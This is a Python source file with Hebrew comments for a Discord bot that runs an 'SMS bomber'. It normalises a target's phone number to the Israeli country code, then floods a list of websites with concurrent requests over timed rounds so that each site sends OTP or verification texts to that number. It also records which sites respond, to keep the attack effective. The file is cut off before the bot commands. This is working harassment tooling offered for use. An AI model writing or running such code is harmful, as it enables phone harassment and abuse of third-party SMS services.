python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# bot.py - בוט דיסקורד שמפעיל את הבומבר

import asyncio, json, os, re, threading, time
import urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED

import discord
from discord.ext import commands
import requests

HERE = os.path.dirname(os.path.abspath(__file__))
SITES_FILE = os.path.join(HERE, "sites.txt")
ALIVE_FILE = os.path.join(HERE, "alive.json")
TOKEN_FILE = os.path.join(HERE, "token.txt")

# ================= הגדרות =================
COUNTRY_CODE = "972"
ROUND_SECONDS = 30
WORKERS = 40
TIMEOUT = 8
USE_ALIVE_ONLY = True
MAX_ROUNDS = 30

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "Origin": "https://www.google.com",
    "Referer": "https://www.google.com/",
    "Content-Type": "application/json",
}

PAYLOAD = ("phone", "mobile", "number")

# ================= עזרים =================
def load_sites():
    try:
        with open(SITES_FILE, encoding="utf-8") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except FileNotFoundError:
        return []

def load_alive():
    try:
        with open(ALIVE_FILE, encoding="utf-8") as f:
            return set(json.load(f))
    except Exception:
        return set()

def save_alive(alive):
    try:
        with open(ALIVE_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(alive), f, ensure_ascii=False, indent=1)
    except Exception:
        pass

def norm_phone(raw):
    p = re.sub(r"[^\d+]", "", raw or "")
    if not p:
        return ""
    if p.startswith("+"):
        p = p[1:]
    elif p.startswith("00"):
        p = p[2:]
    if p.startswith("0"):
        p = COUNTRY_CODE + p[1:]
    elif not p.startswith(COUNTRY_CODE):
        p = COUNTRY_CODE + p
    return p

def build_url(site, phone):
    if "{phone}" in site:
        return site.replace("{phone}", phone)
    if "?" in site:
        return site + "&phone=" + phone
    return site + "?phone=" + phone

def fire(session, site, phone):
    """שולח בקשה. אם POST לא נתמך - מנסה GET. מחזיר True אם האתר חי."""
    url = build_url(site, phone)
    data = {k: phone for k in PAYLOAD}
    r = None
    try:
        r = session.post(url, json=data, timeout=TIMEOUT, allow_redirects=True)
    except Exception:
        pass

    if r is None or r.status_code in (404, 405):
        try:
            r = session.get(url, timeout=TIMEOUT, allow_redirects=True)
        except Exception:
            return False

    if r.status_code in (204, 429):
        return True
    if r.status_code in (200, 201, 202):
        ct = (r.headers.get("content-type") or "").lower()
        if "json" in ct:
            return True
        body = r.text[:500].lower()
        if any(k in body for k in ("otp", "sms", "code", "success", "sent", "verif")):
            return True
    return False

def bar(pct, width=14):
    fill = max(0, min(width, int(width * pct)))
    return "█" * fill + "░" * (width - fill)

# ================= המנוע =================
class Job:
    def __init__(self, phone, rounds):
        self.phone = phone
        self.rounds = rounds
        self.round = 1
        self.sent = 0
        self.ok = 0
        self.running = False
        self.stop = False
        self.alive = set()
        self.started = time.time()

def run_job(job, sites):
    ex = ThreadPoolExecutor(max_workers=WORKERS)
    session = requests.Session()
    session.headers.update(HEADERS)
    try:
        for rnd in range(1, job.rounds + 1):
            if job.stop:
                break
            job.round = rnd
            end = time.time() + ROUND_SECONDS
            queue = list(sites)
            pending = {}
            while time.time() < end and not job.stop:
                if not queue and len(pending) < WORKERS:
                    queue = list(sites)
                while queue and len(pending) < WORKERS:
                    s = queue.pop(0)
                    pending[ex.submit(fire, session, s, job.phone)] = s
                if not pending:
                    break
                done, _ = wait(list(pending), timeout=0.5, return_when=FIRST_COMPLETED)
                for f in done:
                    site = pending.pop(f, None)
                    job.sent += 1
                    try:
                        if f.result():
                            job.ok += 1
                            if site:
                                job.alive.add(site)
                    except Exception:
                        pass
    except Exception as e:
        print("שגיאה במנוע:", e)
    finally:
        try:
            session.close()
        except Exception:
            pass
        ex.shutdown(wait=False)
        job.running = False

# =============
